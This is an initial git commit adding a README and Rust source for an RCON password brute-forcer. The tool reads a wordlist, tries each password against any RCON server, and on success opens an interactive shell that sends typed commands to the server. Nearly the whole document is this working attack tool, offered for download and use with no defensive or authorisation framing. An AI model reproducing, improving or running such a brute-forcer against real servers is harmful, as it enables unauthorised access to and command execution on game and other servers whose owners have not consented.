dd564efa48f8058c4a9b009a6ee8012a713e85c0
pepej <semenovich-nikitka@mail.ru>
2021-04-15 21:28:35 +1000

    Initial commit

---
+++ README.md
@@ -0,0 +1,17 @@
+# Remote connection bruteforcer
+Allows you to bruteforce any rcon based server
+
+## Getting Started
+Download a wordlist or generate one by yourself (using [crunch](https://github.com/crunchsec/crunch) as example)
+
+Download latest binary from [releases](https://github.com/PepejHa4ker/rcon-bruteforcer/releases).\
+Execute binary: `./rcon-bruteforce [host:port] [dictionary file]`
+
+## Libraries
+* [Console](https://crates.io/crates/console) - The ANSI console library
+* [Rcon](https://crates.io/crates/rcon) - The rcon connection library
+* [tokio](https://crates.io/crates/tokio) - The async non-blocking I/O library
+
+## Authors
+* **Pepej** - [GitHub](https://github.com/PepejHa4ker) 
+
---
+++ src/main.rs
@@ -0,0 +1,85 @@
+extern crate rcon;
+
+use std::io::{stdin, BufReader, BufRead};
+use rcon::{Connection, Error};
+use std::process::exit;
+use std::env;
+use std::fs::File;
+
+use console::style;
+
+#[tokio::main]
+async fn main() {
+    // Welcome message
+    println!("{} {} by {}", style("remote connection").red().bold(), style("bruteforcer").red(),
+             style("pepej").blue().bold());
+
+    // User input via launch arguments
+    let args: Vec<String> = env::args().collect();
+
+    if args.len() <= 2 {
+        println!("./rcon-bruteforce [server] [dictionary]");
+    }
+
+    // TODO: Check if addr is valid
+    let server = &args[1];
+
+    // TODO: Add pattern support
+    let dict = &args[2];
+
+    // Just to verify user input
+    println!("{}: {}", style("Server").magenta(), server);
+    println!("{}: {}", style("Dictionary").magenta(), dict);
+    println!(); // Empty line break
+
+    match File::open(dict) {
+        Ok(file) => {
+            let reader = BufReader::new(file);
+
+            // TODO: Add multi threading support
+            for line in reader.lines() {
+
+                   connect(server, line.unwrap().as_str()).await;
+
+            }
+        }
+        Err(e) => println!("{}", e)
+    }
+
+}
+
+async fn connect(addr: &str, password: &str) {
+    // Connect to server and try password
+    match Connection::connect(addr, password).await {
+        Ok(conn) => {
+            // Connection established with correct password
+            println!("{}", style(format!("Connection established to {} using '{}' as password!",
+                                           addr, password)).green().bold());
+
+            handle_session(conn).await
+        },
+        // Connection failed or password wrong (Auth!)
+        Err(e) => println!("{}", style(format!("Connection failed to {} using '{}' because of {:?} error!",
+                                               addr, password, e)).red()) // Used {:?} for their names. As example "Auth" instead of "authentication failed"
+    }
+}
+
+async fn handle_session(mut connection: Connection) {
+    let line = &mut String::new();
+
+    loop {
+        // Read line from stdin to buffer
+        match stdin().read_line(line) {
+            Ok(_) => {
+                // Exec command
+                match connection.cmd(line).await {
+                    Ok(response) => println!("{}", response), // Successfully executed command
+
+                    // TODO: Fix library (IO error: Could not read enough bytes)
+                    Err(e) => println!("Error: {:?}", e) // Something went wrong while sending command to server
+                }
+            }
+            Err(_) => exit(1)
+        }
+    }
+}
